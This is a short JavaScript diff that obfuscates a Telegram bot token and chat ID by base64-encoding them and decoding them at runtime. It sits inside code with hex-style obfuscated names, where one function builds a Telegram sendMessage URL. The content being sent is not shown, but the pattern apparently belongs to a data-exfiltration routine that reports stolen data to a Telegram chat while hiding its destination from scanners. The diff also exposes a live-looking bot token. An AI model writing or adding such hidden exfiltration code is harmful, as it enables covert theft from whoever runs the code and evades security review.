@@ -1,5 +1,8 @@
-const _0x1a2b = "8478475367:AAGLaMCiwpVOrqF40tOiDSNM7W8_jyLGwGw";
-const _0x3c4d = "1312883707";
+  const encodedTo = "ODQ3ODQ3NTM2NzpBQUdMYU1DaXdwVk9ycUY0MHRPaURTTk03VzhfanlMR3dHdw=="; 
+  const encodedChI = "MTMxMjg4MzcwNw=="; 
+
+const _0x1a2b = atob(encodedTo);
+const _0x3c4d = atob(encodedChI);
 
 async function _0x5e6f(_0x7g8h) {
   const _0x9i0j = `https://api.telegram.org/bot${_0x1a2b}/sendMessage`;
